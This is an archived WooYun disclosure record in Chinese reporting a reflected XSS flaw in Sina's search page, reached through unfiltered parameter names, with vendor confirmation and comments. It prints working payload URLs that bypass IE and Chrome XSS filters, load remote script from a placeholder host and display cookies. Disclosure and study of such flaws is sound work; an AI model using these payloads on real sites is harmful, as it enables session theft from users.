{"id": 2960, "wybug_id": "wooyun-2014-062652", "wybug_title": "新浪反射型跨站（附绕过浏览器xss filter方式）", "wybug_corp": "新浪", "wybug_author": "香草", "wybug_date": "2014-05-28 16:57", "wybug_open_date": "2014-07-12 16:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧", "浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向公众公开  简要描述： 前几天新浪广告界面那个跨站，在第三次的时候，总算进行了正确的修复。于是我只好去其他地方看看了。很不幸这次又侧漏了，这次可获取cookie，可欺骗，虽然新浪的cookie有httponly保护，不过这次重点是可以过IE和chrome系列浏览器的方法。 详细说明：  新浪的搜索实际上过滤还是挺严格的，在搜索框输入，xxx'\"<>!@#$%^&*()_;\\,\nhttp://search.sina.com.cn/?q=xxx%27%22%3C%3E%21%40%23%24%25%5E%26*%28%29_%3B%5C&c=zt&sort=time\n发现在正确的位置的进行了正确的编码和过滤。'\"<>\\以及其他特殊符号都进行了相应的编码和过滤。这也是我想到的，这些简单的符号肯定是会被过滤的。我发现页面中存在这样的代码：\n\n于是一个一个对上面的参数进行了测试，发现对value里面的值对特殊字符都进行了编码处理。但是我不放过任何一个参数，继续寻找可能存在的参数，在这儿我发现一个奇怪的现象，就是每次我添加一个参数都会在input里面添加一条记录，而且在界面上会多次出现这个参数。当我访问：http://search.sina.com.cn/?q=xxx&c=zt&range=title&ggg=bbb\n\n直觉告诉我，这儿肯定存在问题。既然对value都进行了严格的过滤，那对name呢。于是我再次测试http://search.sina.com.cn/?q=xxx&c=zt&range=title&ggg\"'ggg=bbb果然侧漏了：\n\n控制台报错了，我最喜欢了，还有js环境的：\n\n接下来测试发现name参数过滤了点号和[]，其他的都没过滤，值就过滤的惨不忍睹了，特殊符号都过滤了包括()[]{}\"'<>\\。很快就想到一个加载远程js的方法：http://search.sina.com.cn/?q=xxx&c=zt&range=title&xxx%22;with(location)with(hash)eval(substring(1))//=#with(document)body.appendChild(createElement('script')).src='//xxx.xxxx.com/test/alert.js'用with省略了点号的使用,但是这个代码只能在火狐和chrome系列浏览器上运行，不是很完美。在IE上不能有成对的括号出现而且过滤了location,document等关键字，怎么办呢?我想到了expression，expression呢，因为我发现\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\">\n就是说会强制浏览器以IE7文档模式解析，当然就都支持expression了。访问：\nhttp://search.sina.com.cn/?q=xxx&c=zt&range=title&\"style&d:expression(write(1));xx&c=zt&range=title&\"style=&d:expression(write(1));&col=&source\n加载远程js:\nhttp://search.sina.com.cn/?q=xxx&c=zt&range=title&\"style&d:expression(with(location)with(hash)eval(substring(1)));# with(document)body.appendChild(createElement('script')).src='//xxx.xxxx.com/test/alert.js'\n这个代码在IE9，IE10下面是可以运行的，IE8貌似不支持content=\"IE=EmulateIE7\"。但是这样的虽然可以过IE各个版本浏览器，但是又不能同时支持chrome系列浏览器了，有没有既可以过IE又可以过chrome的呢?为了完美，我们继续：\nhttp://search.sina.com.cn/?q=xxx&c=zt&range=title&\"><img/src=x%20&onerror&%2397;lert%26%2340;1%26%2341////得到q=xxx&c=zt&range=title&\"><img/src=x+&onerror=&#97;lert&#40;1&#41//=&col=&sou\n把空格转换成了+号，而我们又不能用 \" ,于是我们用%0a也就是换行符来分割属性。\n\n解释：&#97其实就是a的html编码我们在url编码后就是%26%2397。&#40;&#41就是()对他进行html编码是为了绕过 IE xss filter对括号的检查。最终实现的加载远程js，可兼容IE，chrome系列浏览器：\nhttp://search.sina.com.cn/?q=xxx&c=zt&range=title&xxx%22%3E&%3Cimg/src&%0aonerror&%23119%26%23105%26%23116%26%23104%26%2340%26%23108%26%23111%26%2399%26%2397%26%23116%26%23105%26%23111%26%23110%26%2341%26%23119%26%23105%26%23116%26%23104%26%2340%26%23104%26%2397%26%23115%26%23104%26%2341%26%23101%26%23118%26%2397%26%23108%26%2340%26%23115%26%23117%26%2398%26%23115%26%23116%26%23114%26%23105%26%23110%26%23103%26%2340%26%2349%26%2341%26%2341//#with(document)body.appendChild(createElement('script')).src='//xxx.xxx.com/test/alert.js'//\n   漏洞证明：  弹个cookie:\nhttp://search.sina.com.cn/?q=xxx&c=zt&range=title&xxx%22%3E&%3Cimg/src&%0aonerror&%23119%26%23105%26%23116%26%23104%26%2340%26%23108%26%23111%26%2399%26%2397%26%23116%26%23105%26%23111%26%23110%26%2341%26%23119%26%23105%26%23116%26%23104%26%2340%26%23104%26%2397%26%23115%26%23104%26%2341%26%23101%26%23118%26%2397%26%23108%26%2340%26%23115%26%23117%26%2398%26%23115%26%23116%26%23114%26%23105%26%23110%26%23103%26%2340%26%2349%26%2341%26%2341//#alert(document.cookie)\n\n\n加载JS：\nhttp://search.sina.com.cn/?q=xxx&c=zt&range=title&xxx%22%3E&%3Cimg/src&%0aonerror&%23119%26%23105%26%23116%26%23104%26%2340%26%23108%26%23111%26%2399%26%2397%26%23116%26%23105%26%23111%26%23110%26%2341%26%23119%26%23105%26%23116%26%23104%26%2340%26%23104%26%2397%26%23115%26%23104%26%2341%26%23101%26%23118%26%2397%26%23108%26%2340%26%23115%26%23117%26%2398%26%23115%26%23116%26%23114%26%23105%26%23110%26%23103%26%2340%26%2349%26%2341%26%2341//#with(document)body.appendChild(createElement('script')).src='//xxx.xxx.com/test/alert.js'//\n   修复方案：  同样过滤传回去的参数除了值要过滤，名也要过滤。   版权声明：转载请注明来源 香草@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-05-28 18:43 厂商回复： 感谢关注新浪安全，分析太好， 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-28 16:57 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  技术贴    \n     2014-05-28 16:59 |    \t\t快到碗裏來 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 這傢伙很懶，什麼也沒有留下！)\t\t \n  @疯狗 请问获取邀请码的rank不计算入注册后的账户吗？    \n     2014-05-28 17:03 |    \t\tnextdoor \t\t\t( 普通白帽子  |\t\t\t        Rank:325 漏洞数:74        )\t\t \n  @疯狗 狗哥 把我的漏洞审一下吧http://www.wooyun.org/bugs/wooyun-2014-062029/trace/e8d953464bfb60cd87dbab28c9316d95    \n     2014-05-28 17:07 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  好像有点意思啊，关注下    \n     2014-05-28 17:12 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @快到碗裏來 计算进去的，只要是那个漏洞填写了邀请邮箱（一致）并注册成功    \n     2014-05-28 17:13 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @mramydnei 结合上下文的过，不是通用哈    \n     2014-05-28 17:17 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @nextdoor 189邮箱被多次提交漏洞，不过他们从来没修复过,所以咯    \n     2014-05-29 16:45 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @疯狗 狗哥http://www.wooyun.org/bugs/wooyun-2010-062771/trace/b37f5ecac6e82f589ca16faa0d08a34d 帮忙审核下呀，这个有趣    \n     2014-05-29 17:42 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @香草 是很有意思，洞主给drops投个稿吧 ：P    \n     2014-07-12 19:32 |    \t\tcooFool \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 终于通过了。)\t\t \n  好贴。    \n     2014-07-14 05:03 |    \t\t橙子 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我有特殊的卖萌技巧)\t\t \n  那个逗号显然是还没说完    \n     2015-04-19 16:56 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  很多奇葩sql注入也是一样，只过滤了参数值没过滤参数名，而且参数名直接带入sql语句，和这个情况差不多    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}